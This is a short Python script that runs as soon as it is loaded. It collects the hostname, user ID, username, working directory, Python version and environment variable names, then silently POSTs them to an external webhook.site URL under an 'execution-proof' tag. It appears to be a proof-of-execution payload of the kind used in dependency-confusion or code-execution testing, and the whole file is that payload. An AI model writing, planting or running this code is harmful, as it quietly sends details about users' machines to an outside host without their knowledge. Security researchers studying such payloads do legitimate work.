import os, socket, sys, json, getpass, urllib.request
def _r(tag, url):
    try:
        info = {"marker": tag, "host": socket.gethostname(), "uid": str(getattr(os, "getuid", lambda: "na")()),
                "user": getpass.getuser(), "cwd": os.getcwd(), "py": sys.version.split()[0],
                "env": sorted(os.environ.keys())[:60]}
        req = urllib.request.Request(url, data=json.dumps(info).encode(),
                                     headers={"Content-Type": "application/json", "User-Agent": "execution-proof"})
        urllib.request.urlopen(req, timeout=15).read()
    except Exception:
        pass
_r("execution-proof", "https://webhook.site/11111111-1111-1111-1111-111111111111/execution-proof")
